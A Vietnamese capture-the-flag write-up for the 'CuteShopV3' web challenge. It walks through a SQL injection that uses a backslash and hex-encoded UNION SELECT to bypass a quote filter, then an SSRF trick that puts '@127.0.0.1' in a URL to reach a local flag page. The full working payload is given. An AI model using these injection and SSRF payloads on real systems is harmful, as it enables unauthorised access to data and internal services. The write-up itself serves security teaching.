# CuteShopV3 (184)

Sau khi đọc source code thì mục tiêu của ta là phải kết nối đến `/flag` với host là `127.0.0.1` thì sẽ lấy được flag.

```php
define("BASE_API_URL", "http://shop-api:8080"); // Trong config.php

// Trong shopping.php
$items_img = json_decode(file_get_contents(BASE_API_URL . "/items.json"))->{"msg"};
$items = json_decode(file_get_contents(BASE_API_URL . $_SESSION["api_path"] . "/items.json"))->{"msg"};
```

Để có thể kết nối được với `127.0.0.1/flag` thì có một cách là thông qua `$_SESSION["api_path"]`

Để làm như thế thì `$_SESSION["api_path"]` phải bằng `@127.0.0.1/flag.php#`

→ Url trở thành: `http://shop-api:8080@127.0.0.1/flag.php#/items.json`

URL này sẽ kết nối đến `127.0.0.1/flag.php` với `username:password` là `shop-api:8080` (không quan trọng username với password là gì)

---

Việc tiếp theo cần làm đó chính là tìm cách để chỉnh được `$_SESSION["api_path"]` của mình.

Ở trong file `login.php` ta thấy:

```php
if (preg_match("/'|\"/", $_POST['username']) || preg_match("/'|\"/", $_POST['password']))
		die("Làm ơn đừng hack 😵😵😵");
$sql = "select username, path from users where username='" .$_POST['username'] ."' and password='" .$_POST['password'] ."'";
$sth = $conn->query($sql);
```

Có thể thấy rằng ở đây có thể SQLi được, vì filter rất đơn giản (chỉ loại trừ 2 kí tự `"` và `'`)

Nếu ta nhập ký tự `\` vào username thì có thể thoát khỏi dấu ngoặc đơn dễ dàng và câu lệnh sql trở thành

`select username, path from users where username=' \' and password='" .$_POST['password'] ."'`

Vì vậy SQL chỉ kiểm tra nếu `username = ' \' and password='` và hiển nhiên sẽ không trả về thứ gì vì không cúa username nào như thế.

Bây giờ ta có thể nhập các câu lệnh SQL thoải mái vào ô `password`

Vì ta cần `path = @127.0.0.1/flag.php#` nên ta có thể sử dụng `UNION` để thêm dữ liệu tuỳ thích vào

Câu lệnh SQLi sẽ có dạng:  `UNION SELECT 'a' AS username, '@127.0.0.1/flag.php#' AS path -- -`  

Nhưng vì filter chặn kí tự `'` nên ta có thể đổi về dạng hex

→ Payload cuối cùng:

`username = \`

`password =  UNION SELECT 0x61 AS username , 0x403132372e302e302e312f666c61672e70687023 AS path -- -`

Lưu ý: có dấu cách ở trước `UNION`

Sau khi nhập vào sẽ lấy được flag:

![Flag Screen](shopcuteV3.png)

Flag: `HCMUS-CTF{r@inb0w_hAv3_7_c0loR_wh1le_URL_HavE_8_p@rtS}`